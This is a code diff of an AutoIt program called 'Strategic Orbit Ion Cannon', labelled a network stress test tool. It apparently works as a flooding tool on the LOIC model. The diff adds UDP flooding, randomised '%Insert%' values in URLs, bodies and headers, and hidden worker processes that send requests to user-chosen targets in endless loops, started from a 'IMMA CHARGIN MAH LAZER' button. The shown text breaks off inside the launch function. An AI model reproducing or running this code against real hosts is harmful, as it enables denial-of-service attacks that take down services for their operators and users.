@@ -1,83 +1,221 @@
 #region ;**** Directives created by AutoIt3Wrapper_GUI ****
 #AutoIt3Wrapper_icon=SOIC.ico
+#AutoIt3Wrapper_UseUpx=n
 #AutoIt3Wrapper_UseX64=n
 #AutoIt3Wrapper_Res_Comment=DownloadLink = https://github.com/Anonymous-Dev/Soic
 #AutoIt3Wrapper_Res_Description=Network stress test tool
-#AutoIt3Wrapper_Res_Fileversion=1.0.0.5
+#AutoIt3Wrapper_Res_Fileversion=1.0.0.7
 #AutoIt3Wrapper_Res_Fileversion_AutoIncrement=p
 #AutoIt3Wrapper_Res_LegalCopyright=© Anonymous Author Vlad
 #AutoIt3Wrapper_AU3Check_Stop_OnWarning=y
 #AutoIt3Wrapper_Run_Tidy=y
 #endregion ;**** Directives created by AutoIt3Wrapper_GUI ****
-#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
-#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
-;
-#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
-#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
-;
-#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
-#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
-;
-#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
-#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
-;
+Global $Debug_LV = False
+Global $__gaInProcess_WinAPI[64][2] = [[0, 0]], $_lv_ghLastWnd, $__ghSBLastWnd, $EditHwnd
 $oMyError = ObjEvent("AutoIt.Error", "IgnoreErr") ; Ignore errors and resume script
 ;$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc") ; Initialize a COM error handler
-If $CmdLine[0] = 3 Then
+; #STRUCTURE# ===================================================================================================================
+; Name...........: $tagLVITEM
+; Description ...: Specifies or receives the attributes of a list-view item
+; Fields ........: Mask      - Set of flags that specify which members of this structure contain data to be set or which members
+;                  +are being requested. This member can have one or more of the following flags set:
+;                  |$LVIF_COLUMNS     - The Columns member is valid
+;                  |$LVIF_DI_SETITEM  - The operating system should store the requested list item information
+;                  |$LVIF_GROUPID     - The GroupID member is valid
+;                  |$LVIF_IMAGE       - The Image member is valid
+;                  |$LVIF_INDENT      - The Indent member is valid
+;                  |$LVIF_NORECOMPUTE - The control will not generate LVN_GETDISPINFO to retrieve text information
+;                  |$LVIF_PARAM       - The Param member is valid
+;                  |$LVIF_STATE       - The State member is valid
+;                  |$LVIF_TEXT        - The Text member is valid
+;                  Item      - Zero based index of the item to which this structure refers
+;                  SubItem   - One based index of the subitem to which this structure refers
+;                  State     - Indicates the item's state, state image, and overlay image
+;                  StateMask - Value specifying which bits of the state member will be retrieved or modified
+;                  Text      - Pointer to a string containing the item text
+;                  TextMax   - Number of bytes in the buffer pointed to by Text, including the string terminator
+;                  Image     - Index of the item's icon in the control's image list
+;                  Param     - Value specific to the item
+;                  Indent    - Number of image widths to indent the item
+;                  GroupID   - Identifier of the tile view group that receives the item
+;                  Columns   - Number of tile view columns to display for this item
+;                  pColumns  - Pointer to the array of column indices
+; Author ........: Anonymous
+; Remarks .......:
+; Remarks .......:
+; ===============================================================================================================================
+Global Const $tagLVITEM = "uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & _
+		"int Indent;int GroupID;uint Columns;ptr pColumns"
+; #INTERNAL_USE_ONLY# ===========================================================================================================
+; Name...........: $tagMEMMAP
+; Description ...: Contains information about the memory
+; Fields ........: hProc - Handle to the external process
+;                  Size  - Size, in bytes, of the memory block allocated
+;                  Mem   - Pointer to the memory block
+; Author ........: Anonymous
+; Remarks .......:
+; ===============================================================================================================================
+Global Const $tagMEMMAP = "handle hProc;ulong_ptr Size;ptr Mem"
+If $CmdLine[0] = 3 And $CmdLine[1] = "UDP" Then
 	Opt("TrayIconHide", 1)
-	Local $athread[16], $2xx, $3xx, $4xx, $5xx, $Failed, $TotKB, $oHTTP, $response0 = ""
-	For $column = 0 To 15
-		$athread[$column] = RegRead("HKCU\Software\soic", $CmdLine[1] & $column)
+	Local $athread[5], $2xx = 0, $Failed = 0, $TotKB, $StatImg = 0xffffff, $Insert[4], $response, $tMemMap, $Match0
+	$atStatus = DllStructCreate("int[7]; int[12]; char[128]")
+	$iStatus = DllStructGetSize($atStatus)
+	$pStatus = DllStructGetPtr($atStatus)
+	$tMemMap = DllStructCreate($tagMEMMAP)
+	DllStructSetData($tMemMap, "hProc", $CmdLine[2])
+	DllStructSetData($tMemMap, "Size", $iStatus)
+	DllStructSetData($tMemMap, "Mem", $CmdLine[3])
+	_MemRead($tMemMap, $CmdLine[3], $pStatus, $iStatus)
+	$thread = DllStructGetData($atStatus, 2, 4)
+	$Delay = DllStructGetData($atStatus, 2, 12)
+	For $column = 0 To 4
+		$athread[$column] = StringReplace(_GUICtrlListView_GetItemText(HWnd(DllStructGetData($atStatus, 2, 1)), DllStructGetData($atStatus, 2, 3), $column, DllStructGetData($atStatus, 2, 11)), "%IP%", DllStructGetData($atStatus, 3))
+		If StringInStr($athread[$column], "%Insert%") Then $Insert[$column] = 1
 		If @error Then Exit
 	Next
+	$aIpPort = StringSplit($athread[0], ":")
+	$aPost = StringSplit($athread[2], @CRLF, 1)
+	; Start The UDP Services
+	;==============================================
+	UDPStartup()
+	; Register the cleanup function.
+	OnAutoItExitRegister("Cleanup")
+	; Bind to a SOCKET
+	;==============================================
+	$socket = UDPOpen($aIpPort[1], $aIpPort[2])
+	If @error <> 0 Then Exit
+	While 1
+		If $Insert[2] Then $aPost = StringSplit(StringReplace($athread[2], "%Insert%", Random(0, 9999999999, 1)), @CRLF, 1)
+		For $i = 1 To $aPost[0]
+			Sleep($Delay)
+			$Post = $aPost[$i]
+			$aPattern = StringRegExp($aPost[$i], "(?i)%Response(.+)%", 1)
+			If @error = 0 Then
+				$aMatch = StringRegExp($response, $aPattern[0], 1)
+				If @error = 0 Then $Match0 = $aMatch[0]
+				$Post = StringRegExpReplace($aPost[$i], "(?i)%Response.+%", $Match0)
+			EndIf
+			$status = UDPSend($socket, $Post)
+			$T0 = TimerInit()
+			While 1
+				$response = UDPRecv($socket, 500, 1)
+				If $response Or TimerDiff($T0) > 10000 Then ExitLoop
+			WEnd
+			$Byte = StringLen($response)
+			$TotKB += $Byte / 1024
+			DllStructSetData($atStatus, 1, $TotKB, 6)
+			$BintoStr = BinaryToString($response)
+			$response2 = $response & @CRLF & $BintoStr
+			$Byte = StringLen($response2)
+			If $thread = $athread[4] Then
+				$atStatus = DllStructCreate("int[7]; int[11]; char[" & $Byte & "]")
+				$pStatus = DllStructGetPtr($atStatus)
+				$iStatus = DllStructGetSize($atStatus)
+				DllStructSetData($atStatus, 1, $2xx, 1)
+				DllStructSetData($atStatus, 1, $Failed, 5)
+				DllStructSetData($atStatus, 3, $response2)
+			EndIf
+			DllStructSetData($tMemMap, "Size", $iStatus)
+			Switch $response
+				Case ""
+					$Failed += 1
+					DllStructSetData($atStatus, 1, $Failed, 5)
+					$StatImg = 0xffaaaa
+				Case Else
+					$2xx += 1
+					DllStructSetData($atStatus, 1, $2xx, 1)
+					$StatImg = 0xaaffaa
+			EndSwitch
+			DllStructSetData($atStatus, 1, $StatImg, 7)
+			_MemWrite($tMemMap, $pStatus, $CmdLine[3], $iStatus)
+		Next
+	WEnd
+ElseIf $CmdLine[0] = 3 And $CmdLine[1] <> "UDP" Then
+	Opt("TrayIconHide", 1)
+	Local $athread[16], $2xx = 0, $3xx = 0, $4xx = 0, $5xx = 0, $Failed = 0, $TotKB, $StatImg = 0xffffff, $oHTTP, $Insert[4]
+	$atStatus = DllStructCreate("int[7]; int[12]; char[128]")
+	$iStatus = DllStructGetSize($atStatus)
+	$pStatus = DllStructGetPtr($atStatus)
+	Local $tMemMap
+	$tMemMap = DllStructCreate($tagMEMMAP)
+	DllStructSetData($tMemMap, "hProc", $CmdLine[2])
+	DllStructSetData($tMemMap, "Size", $iStatus)
+	DllStructSetData($tMemMap, "Mem", $CmdLine[3])
+	_MemRead($tMemMap, $CmdLine[3], $pStatus, $iStatus)
+	$athread[15] = DllStructGetData($atStatus, 2, 10)
+	$thread = DllStructGetData($atStatus, 2, 4)
+	$Delay = DllStructGetData($atStatus, 2, 12)
+	For $column = 0 To 14
+		$athread[$column] = StringReplace(_GUICtrlListView_GetItemText(HWnd(DllStructGetData($atStatus, 2, 1)), DllStructGetData($atStatus, 2, 3), $column, DllStructGetData($atStatus, 2, 11)), "%IP%", DllStructGetData($atStatus, 3))
+		If StringInStr($athread[$column], "%Insert%") Then $Insert[$column] = 1
+		If @error Then Exit
+	Next
+	If $athread[1] = "" Then $athread[1] = "GET" ; default method if none specified
 	; split headers to name/value pairs and place to array
-	$aNameValue = StringSplit($athread[3], @CRLF, 1)
-	$T0 = TimerInit()
+	$aNameValue = StringSplit(StringRegExpReplace($athread[3], "(?m)^(.+?): ", "$1" & @CRLF), @CRLF, 1)
+	$address = $athread[0]
+	$Post = $athread[2]
 	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
 	With $oHTTP
 		.SetProxy($athread[15], $athread[5], "") ; Use proxy_server for all domains. BypassList = ""
-		.SetTimeouts($athread[10], $athread[11], $athread[12], $athread[13])
+		If ($athread[10] And $athread[11] And $athread[12] And $athread[13]) <> "" Then .SetTimeouts($athread[10], $athread[11], $athread[12], $athread[13])
 		;.SetClientCertificate("LOCAL_MACHINE\Personal\My Certificate")
 	EndWith
 	While 1
 		With $oHTTP
-			.Open($athread[1], $athread[0], True)
+			Sleep($Delay)
+			If $Insert[0] Then $address = StringReplace($athread[0], "%Insert%", Random())
+			.Open($athread[1], $address, True)
 			;.SetAutoLogonPolicy(2) ; Always = 0, default OnlyIfBypassProxy = 1, Never = 2
-			.SetCredentials($athread[6], $athread[7], 1) ; set credentials for proxy
-			.SetCredentials($athread[8], $athread[9], 0) ; set credentials for server
+			If $athread[6] <> "" Then .SetCredentials($athread[6], $athread[7], 1) ; set credentials for proxy
+			If $athread[8] <> "" Then .SetCredentials($athread[8], $athread[9], 0) ; set credentials for server
 			For $header = 1 To $aNameValue[0] - 1 Step 2
 				If $aNameValue[$header] = "" Or $aNameValue[$header + 1] = "" Then ExitLoop
-				.SetRequestHeader($aNameValue[$header], $aNameValue[$header + 1])
+				$HeaderVal = $aNameValue[$header + 1]
+				If $Insert[3] Then $HeaderVal = StringReplace($aNameValue[$header + 1], "%Insert%", Random())
+				.SetRequestHeader($aNameValue[$header], $HeaderVal)
 			Next
-			.Send($athread[2])
+			If $Insert[2] Then $Post = StringReplace($athread[2], "%Insert%", Random())
+			.Send($Post)
 			;.Abort
 			.WaitForResponse($athread[14])
-			;_ArrayDisplay($aListView)
-			;$timeinit = TimerInit()
-			;MsgBox(0, "Time Difference", $Pid)
-			$response1 = .Responsetext
-			$TotKB += BinaryLen(StringToBinary($response1)) / 1024
-			If $CmdLine[3] = 1 And $response1 <> "" And TimerDiff($T0) > 1000 Then
-				RegWrite("HKCU\Software\soic", "Response", "REG_MULTI_SZ", .StatusText & @CRLF & $response1)
-				$response0 = $response1
+			$response = .StatusText & @CRLF & .GetAllResponseHeaders & .Responsetext
+			$Byte = StringLen($response)
+			$TotKB += $Byte / 1024
+			If $thread = $athread[4] Then
+				$atStatus = DllStructCreate("int[7]; int[12]; char[" & $Byte & "]")
+				$pStatus = DllStructGetPtr($atStatus)
+				$iStatus = DllStructGetSize($atStatus)
+				DllStructSetData($atStatus, 3, $response)
 			EndIf
+			DllStructSetData($tMemMap, "Size", $iStatus)
 			Switch .Status
 				Case 200 To 299
 					$2xx += 1
+					$StatImg = 0xaaffaa
 				Case 300 To 399
 					$3xx += 1
+					$StatImg = 0xffff55
 				Case 400 To 499
 					$4xx += 1
+					$StatImg = 0xaaaaff
 				Case 500 To 599
 					$5xx += 1
+					$StatImg = 0xaaaaaa
 				Case Else
 					$Failed += 1
+					$StatImg = 0xffaaaa
 			EndSwitch
+			DllStructSetData($atStatus, 1, $2xx, 1)
+			DllStructSetData($atStatus, 1, $3xx, 2)
+			DllStructSetData($atStatus, 1, $4xx, 3)
+			DllStructSetData($atStatus, 1, $5xx, 4)
+			DllStructSetData($atStatus, 1, $Failed, 5)
+			DllStructSetData($atStatus, 1, $TotKB, 6)
+			DllStructSetData($atStatus, 1, $StatImg, 7)
+			_MemWrite($tMemMap, $pStatus, $CmdLine[3], $iStatus)
 		EndWith
-		If TimerDiff($T0) > 1000 Then
-			RegWrite("HKCU\Software\soic", $CmdLine[1] & "Status" & $CmdLine[2], "REG_MULTI_SZ", $2xx & "|" & $3xx & "|" & $4xx & "|" & $5xx & "|" & $Failed & "|" & $TotKB)
-			$T0 = TimerInit()
-		EndIf
 	WEnd
 Else
 	Opt("GUICloseOnESC", 0);turn off exit on esc.
@@ -89,7 +227,6 @@ Else
 	TrayItemSetOnEvent(-1, "GuiClose")
 	Global $DebugIt = 0 ; write some info to std out
 	Global $Debug_CB = False
-	Global $Debug_LV = False
 	Global $Debug_SB = False
 	Global Const $WM_MOVING = 0x0216
 	Global Const $WM_CAPTURECHANGED = 0x0215
@@ -115,26 +252,13 @@ Else
 	Global $__LISTVIEWCTRL = -999 ; holds Hwnd of ListView
 	Global $Gui, $editFlag
 	Global $bCanceled = False
-	Global $editHwnd ;= the Hwnd of the editing control.
+	Global $EditHwnd ;= the Hwnd of the editing control.
 	Global $editCtrl ;= the CtrlId of the editing control.
-	Global $lvControlGui, $lvInput, $lvInput1, $lvEdit, $lvCombo, $lvCombo1, $lvDate, $lvList, $Pid[1] = [@AutoItPID]
-	Global $lvEditText[1][2] ; saves edit control text.
+	Global $lvControlGui, $lvInput, $lvUD, $lvEdit, $lvCombo, $lvCombo1, $lvDate, $lvList, $Pid[1] = [@AutoItPID], $KB0, $Hit0, $selItemID0, $aCheckedIndices[1], $lenth = 133
 	Global $LVINFO[11]; client coordinates of currently selected ListView subitem.
-	Global $_lv_ghLastWnd, $__ghSBLastWnd
-	Global $__gaInProcess_WinAPI[64][2] = [[0, 0]]
 	; #VARIABLES# ===================================================================================================================
 	Global $_UDF_GlobalIDs_Used[16][55535 + 2 + 1] ; [index][0] = HWND, [index][1] = NEXT ID $_UDF_GlobalID_MAX_IDS = 55535 $_UDF_GlobalIDs_OFFSET = 2 $_UDF_GlobalID_MAX_WIN = 16
 	; ===============================================================================================================================
-	; #INTERNAL_USE_ONLY# ===========================================================================================================
-	; Name...........: $tagMEMMAP
-	; Description ...: Contains information about the memory
-	; Fields ........: hProc - Handle to the external process
-	;                  Size  - Size, in bytes, of the memory block allocated
-	;                  Mem   - Pointer to the memory block
-	; Author ........: Anonymous
-	; Remarks .......:
-	; ===============================================================================================================================
-	Global Const $tagMEMMAP = "handle hProc;ulong_ptr Size;ptr Mem"
 	; #STRUCTURE# ===================================================================================================================
 	; Name...........: $tagTOKEN_PRIVILEGES
 	; Description ...: Contains information about a set of privileges for an access token
@@ -154,52 +278,20 @@ Else
 	; Remarks .......:
 	; ===============================================================================================================================
 	Global Const $tagPOINT = "long X;long Y"
-	; #STRUCTURE# ===================================================================================================================
-	; Name...........: $tagLVITEM
-	; Description ...: Specifies or receives the attributes of a list-view item
-	; Fields ........: Mask      - Set of flags that specify which members of this structure contain data to be set or which members
-	;                  +are being requested. This member can have one or more of the following flags set:
-	;                  |$LVIF_COLUMNS     - The Columns member is valid
-	;                  |$LVIF_DI_SETITEM  - The operating system should store the requested list item information
-	;                  |$LVIF_GROUPID     - The GroupID member is valid
-	;                  |$LVIF_IMAGE       - The Image member is valid
-	;                  |$LVIF_INDENT      - The Indent member is valid
-	;                  |$LVIF_NORECOMPUTE - The control will not generate LVN_GETDISPINFO to retrieve text information
-	;                  |$LVIF_PARAM       - The Param member is valid
-	;                  |$LVIF_STATE       - The State member is valid
-	;                  |$LVIF_TEXT        - The Text member is valid
-	;                  Item      - Zero based index of the item to which this structure refers
-	;                  SubItem   - One based index of the subitem to which this structure refers
-	;                  State     - Indicates the item's state, state image, and overlay image
-	;                  StateMask - Value specifying which bits of the state member will be retrieved or modified
-	;                  Text      - Pointer to a string containing the item text
-	;                  TextMax   - Number of bytes in the buffer pointed to by Text, including the string terminator
-	;                  Image     - Index of the item's icon in the control's image list
-	;                  Param     - Value specific to the item
-	;                  Indent    - Number of image widths to indent the item
-	;                  GroupID   - Identifier of the tile view group that receives the item
-	;                  Columns   - Number of tile view columns to display for this item
-	;                  pColumns  - Pointer to the array of column indices
-	; Author ........: Anonymous
-	; Remarks .......:
-	; ===============================================================================================================================
-	Global Const $tagLVITEM = "uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & _
-			"int Indent;int GroupID;uint Columns;ptr pColumns"
-	$Gui = GUICreate("Strategic Orbit Ion Cannon 1.0.0.5 Beta", 970, 460, 200, 125)
+	_InitEditLib()
+	GUICtrlSetData($lvCombo, "GET|POST|PUT|HEAD|DELETE|OPTIONS|TRACE|UDP")
+	GUICtrlSetData($lvCombo1, "Proxycfg.exe/Netsh.exe winhttp settings")
+	$Gui = GUICreate("Strategic Orbit Ion Cannon 1.0.0.7", 970, 460, 200, 125)
 	GUISetOnEvent(-3, "GuiClose") ; $GUI_EVENT_CLOSE = -3
-	$__LISTVIEWCTRL = GUICtrlCreateListView("TargetUrlIp|Method|PostData|HttpHeaders|Threads|ProxyIp:port|ProxyUserName|ProxyPassword|ServerUserName|" & _
-			"ServerPassword|ResolveTimeout, ms|ConnectTimeout|SendTimeout|ReceiveTimeout|WaitForResponse, sec", 0, 64, 970, 150, 0x0008) ; $LVS_SHOWSELALWAYS = 0x0008
-	GUICtrlSendMsg($__LISTVIEWCTRL, 0x1000 + 54, 0x00000001, 0x00000001) ; $LVM_SETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 54) $LVS_EX_GRIDLINES = 0x00000001
-	GUICtrlSendMsg($__LISTVIEWCTRL, 0x1000 + 54, 0x00000004, 0x00000004) ; $LVM_SETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 54) $LVS_EX_CHECKBOXES = 0x00000004
+	$__LISTVIEWCTRL = GUICtrlCreateListView("TargetUrlIp:Port|Method|PostUdpData|HttpHeaderName: Value|Threads|ProxyIp:Port|ProxyUserName|ProxyPassword|ServerUserName|" & _
+			"ServerPassword|ResolveTimeout, ms|ConnectTimeout|SendTimeout|ReceiveTimeout|WaitForResponse, sec", 0, 64, 970, 150, 0x0008, 0x00004025) ; $LVS_SHOWSELALWAYS, $LVS_EX_LABELTIP + $LVS_EX_GRIDLINES + $LVS_EX_CHECKBOXES + $LVS_EX_FULLROWSELECT
+	$__ListViewHwnd = GUICtrlGetHandle($__LISTVIEWCTRL)
 	$Edit = GUICtrlCreateEdit("", 0, 215, 970, 223)
-	$TimeBetweenThreads = GUICtrlCreateInput("0", 600, 20, 70, 20)
-	GUICtrlSetStyle(-1, 8192) ; $ES_NUMBER = 8192
-	GUICtrlCreateUpdown($TimeBetweenThreads, BitOR(0x0020, 0x0080)) ; $UDS_ARROWKEYS = 0x0020 $UDS_NOTHOUSANDS = 0x0080
-	GUICtrlSetLimit(-1, 999999999999999, 0)
-	GUICtrlCreateLabel("Thread spawn delay, ms", 530, 20, 70, 30)
-	$CBresp = GUICtrlCreateCheckbox("Show Response", 700, 10)
-	$CBreg = GUICtrlCreateCheckbox("Clear registry", 700, 30)
-	GUICtrlSetState(-1, 1)
+	$EditHwnd = GUICtrlGetHandle($Edit)
+	$TimeBetweenThreads = GUICtrlCreateInput("0", 700, 20, 70, 20, 0x2000); $ES_NUMBER
+	GUICtrlCreateUpdown(-1, 0x00A0) ; $UDS_ARROWKEYS + $UDS_NOTHOUSANDS
+	GUICtrlSetLimit(-1, 32767)
+	GUICtrlCreateLabel("Thread spawn delay, ms", 630, 20, 70, 30)
 	$nColumnCount = _GUICtrlListView_GetColumnCount($__LISTVIEWCTRL)
 	;array dim to number of cols, value of each element determines control.
 	;0= ignore, 1= input, 2= combo, 4= calendar, 8 = list, 16 =combo1 , 32=updown , 64=edit , 256 use callback.
@@ -207,16 +299,11 @@ Else
 	;0= ignore, 256 = context callback.
 	Global $LVcolRControl[$nColumnCount] = [256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256] ; right click actions
 	_SetLvContext("ContextMenu") ;set context function
-	$Button1 = GUICtrlCreateCheckbox("IMMA CHARGIN MAH LAZER", 800, 20, 161, 33, 0x1000) ; $BS_PUSHLIKE = 0x1000
-	_InitEditLib("", "", "", "", "", "", $Gui)
-	GUICtrlSetStyle($lvInput1, 8192) ; $ES_NUMBER = 8192
-	$UpDown = GUICtrlCreateUpdown($lvInput1, BitOR(0x0020, 0x0080)) ; $UDS_ARROWKEYS = 0x0020 $UDS_NOTHOUSANDS = 0x0080
-	GUICtrlSetLimit($UpDown, 999999999999999, -1)
-	GUICtrlSetData($lvCombo, "GET|POST|PUT|HEAD|DELETE|OPTIONS|TRACE")
-	GUICtrlSetTip($lvEdit, "Content-type HttpHeader specifies PostData format" & @CRLF & "HttpHeaders format:" & @CRLF & "[Header Name] without colon" & @CRLF & "[Header Value] on the next line")
-	GUICtrlSetData($lvCombo1, "Proxycfg.exe/Netsh.exe winhttp settings")
+	$Button1 = GUICtrlCreateCheckbox("IMMA CHARGIN MAH LAZER", 800, 20, 161, 33, 0x1000) ; $BS_PUSHLIKE
+	Local $array[2] = [830, 970]
+	$StatusBar1 = _GUICtrlStatusBar_Create($Gui, $array)
 	;Read ini file with saved settings
-	Local $hFile = FileOpen(@ScriptName & ".ini", 0) ; $FO_READ = 0
+	Local $hFile = FileOpen(@ScriptName & ".ini", 0) ; $FO_READ
 	Local $sFile = FileRead($hFile, FileGetSize(@ScriptName & ".ini"))
 	FileClose($hFile)
 	; remove last line separator if any at the end of the file
@@ -230,7 +317,6 @@ Else
 		Switch $column
 			Case 4, 5 ; Post,HttpHeader columns
 				$aListView = StringSplit($aListViewColumns[$column], @CRLF & "[$*-PostHeaderSplit-*$]" & @CRLF, 1)
-				ReDim $lvEditText[$aListView[0]][2]
 			Case Else
 				If StringInStr($aListViewColumns[$column], @LF) Then
 					$aListView = StringSplit(StringStripCR($aListViewColumns[$column]), @LF)
@@ -248,23 +334,21 @@ Else
 					If $aListView[$item] = "True" Then _GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $item - 1, True)
 				Case Else
 					_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $item - 1, $aListView[$item], $column - 2)
-					If $column = 4 Or $column = 5 Then ;Post,HttpHeader columns
-						$lvEditText[$item - 1][$column - 4] = $aListView[$item]
-
-					EndIf
 			EndSwitch
 		Next
 	Next
 	$bInitiated = True
+	$aListView = 0
+	$atStatus = 0
 	GUISetState(@SW_SHOW, $Gui)
-
 	While 1
 		Sleep(10)
 		_MonitorEditState($editCtrl, $editFlag, $__LISTVIEWCTRL, $LVINFO)
+		Response()
 		If GUICtrlRead($Button1) = 1 Then ;  1 = $GUI_CHECKED
-			$CheckedCount = _LvGetCheckedCount($__LISTVIEWCTRL)
-			If $CheckedCount > 0 Then
-				$StatusBar1 = _GUICtrlStatusBar_Create($Gui, -1, "Engaging...")
+			$aCheckedIndices = _LvGetCheckedCount($__LISTVIEWCTRL)
+			If $aCheckedIndices[0] > 0 Then
+				_GUICtrlStatusBar_SetText($StatusBar1, "Engaging...", 0)
 				RegDelete("HKCU\Software\soic")
 				Save()
 				Button1Click()
@@ -272,75 +356,79 @@ Else
 		EndIf
 	WEnd
 EndIf
-
-
 _TermEditLib()
 Exit
-
-
-
-Func Button1Click()
-	$nItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
-	Local $aListView[1][$nColumnCount], $nCheckedItem = 0, $aHeaders[$CheckedCount][2], $oHTTP[$CheckedCount], $TotKB0 = 0, $Hits0 = 0
-	For $item = 0 To $nItemCount - 1
-		If _GUICtrlListView_GetItemChecked($__LISTVIEWCTRL, $item) Then
-			$nCheckedItem += 1
-			ReDim $aListView[$nCheckedItem][$nColumnCount + 1]
-			For $column = 0 To $nColumnCount - 1
-				$aListView[$nCheckedItem - 1][$column] = _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $item, $column)
-				Switch $column
-					Case 1
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = "GET" ; default method if none specified
-					Case 2
-						RegWrite("HKCU\Software\soic", $nCheckedItem & $column, "REG_MULTI_SZ", $lvEditText[$item][0])
-						ContinueLoop
-					Case 3 ; split headers to name/value pairs and place to array
-						$aNameValue = StringSplit($lvEditText[$nCheckedItem - 1][1], @CRLF, 1)
-						If $aNameValue[0] > UBound($aHeaders, 2) Then ReDim $aHeaders[$CheckedCount][$aNameValue[0]]
-						For $NameValue = 0 To $aNameValue[0] - 1
-							$aHeaders[$nCheckedItem - 1][$NameValue] = $aNameValue[$NameValue + 1]
-						Next
-					Case 4
-					Case 5
-						Switch $aListView[$nCheckedItem - 1][$column]
-							Case ""
-								$aListView[$nCheckedItem - 1][$nColumnCount] = 1 ; direct connection
-							Case "Proxycfg.exe/Netsh.exe winhttp settings"
-								$aListView[$nCheckedItem - 1][$nColumnCount] = 0 ; use proxy WinHttpSettings from registry
-							Case Else
-								$aListView[$nCheckedItem - 1][$nColumnCount] = 2 ; use specified proxy
-						EndSwitch
-						RegWrite("HKCU\Software\soic", $nCheckedItem & "15", "REG_MULTI_SZ", $aListView[$nCheckedItem - 1][15])
-					Case 6
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default proxyUserName
-					Case 7
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default proxyPass
-					Case 8
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default serverUserName
-					Case 9
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default serverPass
-					Case 10
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 60000 ; default resolve timout
-					Case 11
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 60000 ; default connect timeout
-					Case 12
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 30000 ; default send timeout
-					Case 13
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 30000 ; default receive timeout
-				EndSwitch
-				RegWrite("HKCU\Software\soic", $nCheckedItem & $column, "REG_MULTI_SZ", $aListView[$nCheckedItem - 1][$column])
+Func Cleanup()
+	UDPCloseSocket($socket)
+	UDPShutdown()
+EndFunc   ;==>Cleanup
+Func Response()
+	For $item = 0 To UBound($aListView) - 1
+		If $aListView[$item][16] = GUICtrlRead($__LISTVIEWCTRL) Then
+			Local $2xx, $3xx, $4xx, $5xx, $Failed, $KB1
+			For $thread = 1 To $aListView[$item][4]
+				$2xx += DllStructGetData($atStatus[$item][$thread], 1, 1)
+				$3xx += DllStructGetData($atStatus[$item][$thread], 1, 2)
+				$4xx += DllStructGetData($atStatus[$item][$thread], 1, 3)
+				$5xx += DllStructGetData($atStatus[$item][$thread], 1, 4)
+				$Failed += DllStructGetData($atStatus[$item][$thread], 1, 5)
+				$KB1 += DllStructGetData($atStatus[$item][$thread], 1, 6)
 			Next
-			$UBpid = UBound($Pid)
-			ReDim $Pid[$UBpid + $aListView[$nCheckedItem - 1][4]]
-			For $thread = 1 To $aListView[$nCheckedItem - 1][4]
-				$Pid[$UBpid + $thread - 1] = Run(@ScriptName & " " & $nCheckedItem & " " & $thread & " " & GUICtrlRead($CBresp), @SystemDir, @SW_HIDE, 0x1)
-				Sleep(GUICtrlRead($TimeBetweenThreads))
-			Next
+			$Hit1 = $2xx + $3xx + $4xx + $5xx
+			GUICtrlSetData($Edit, StringFormat("2xx: %u  3xx: %u  4xx: %u  5xx: %u  Fail: %u  Received, KB: %u  KB/s: %.1f  Hit/s: %.1f", $2xx, $3xx, $4xx, $5xx, $Failed, $KB1, $KB1 - $KB0, $Hit1 - $Hit0) & @CRLF & DllStructGetData($atStatus[$item][$thread - 1], 3))
+			$KB0 = $KB1
+			$Hit0 = $Hit1
 		EndIf
 	Next
-
+EndFunc   ;==>Response
+Func Button1Click()
+	Global $aListView[$aCheckedIndices[0]][$nColumnCount + 2], $atStatus[$aCheckedIndices[0]][1], $TotKB0, $Hits0
+	For $item = 0 To $aCheckedIndices[0] - 1
+		$i = $aCheckedIndices[$item + 1]
+		$aListView[$item][16] = _GUICtrlListView_GetItemParam($__LISTVIEWCTRL, $i)
+		For $column = 0 To $nColumnCount - 1
+			$aListView[$item][$column] = _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $i, $column, $lenth)
+		Next
+		Switch $aListView[$item][5]
+			Case ""
+				$aListView[$item][15] = 1 ; direct connection
+			Case "Proxycfg.exe/Netsh.exe winhttp settings"
+				$aListView[$item][15] = 0 ; use proxy WinHttpSettings from registry
+			Case Else
+				$aListView[$item][15] = 2 ; use specified proxy
+		EndSwitch
+		TCPStartup()
+		$proxyIP = TCPNameToIP(StringRegExpReplace($aListView[$item][5], "(?m)^(.+):.+", "$1"))
+		TCPShutdown()
